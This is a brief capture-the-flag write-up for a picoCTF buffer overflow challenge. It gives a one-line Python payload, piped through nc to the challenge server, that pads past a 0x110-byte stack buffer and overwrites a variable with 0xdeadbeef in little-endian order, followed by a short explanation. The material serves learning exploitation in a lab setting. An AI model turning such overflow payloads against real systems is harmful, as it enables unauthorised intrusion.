python -c "import sys; sys.stdout.buffer.write(b'='*(int('0x110',16)-8)+b'\xef\xbe\xad\xde\x0a')" | nc mars.picoctf.net 31890

we read the stack size in the disassembly for 0x110
and we know we want to overwrite the last 8 bytes
because thats the value of the long code variable
we put deadbeef into little endian and input it 
to obtain the flag
